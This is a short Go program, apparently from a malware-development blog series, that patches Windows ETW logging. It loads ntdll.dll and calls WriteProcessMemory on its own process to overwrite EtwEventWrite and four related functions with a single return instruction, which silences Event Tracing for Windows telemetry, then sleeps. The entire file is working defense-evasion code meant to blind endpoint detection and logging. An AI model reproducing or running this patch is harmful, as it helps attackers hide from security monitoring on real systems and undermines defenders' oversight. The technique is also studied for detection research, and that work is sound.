package main

/*

Author: D3Ext
Blog post: https://d3ext.github.io/posts/malware-dev-12/

*/

import (
  "fmt"
  "time"
  "unsafe"
  "syscall"
)

func main(){
  fmt.Println("[*] Loading ntdll.dll and ETW functions...")
  ntdll := syscall.NewLazyDLL("ntdll.dll")
  WriteProcessMemory := syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

  EtwEventWrite := ntdll.NewProc("EtwEventWrite")
  EtwEventWriteEx := ntdll.NewProc("EtwEventWriteEx")
  EtwEventWriteFull := ntdll.NewProc("EtwEventWriteFull")
  EtwEventWriteString := ntdll.NewProc("EtwEventWriteString")
  EtwEventWriteTransfer := ntdll.NewProc("EtwEventWriteTransfer")

  addresses := []uintptr{
    EtwEventWriteFull.Addr(),
    EtwEventWrite.Addr(),
    EtwEventWriteEx.Addr(),
    EtwEventWriteString.Addr(),
    EtwEventWriteTransfer.Addr(),
  }

  patch := []byte{0xC3}

  fmt.Println("[*] Patching functions...")
  for _, addr := range addresses {
    // Write patch bytes to function address
    WriteProcessMemory.Call(
      uintptr(0xffffffffffffffff),
      uintptr(addr),
      uintptr(unsafe.Pointer(&patch[0])),
      uintptr(len(patch)),
      0,
    )
  }

  fmt.Println("[*] Sleeping...")
  time.Sleep(10000 * time.Second)
}

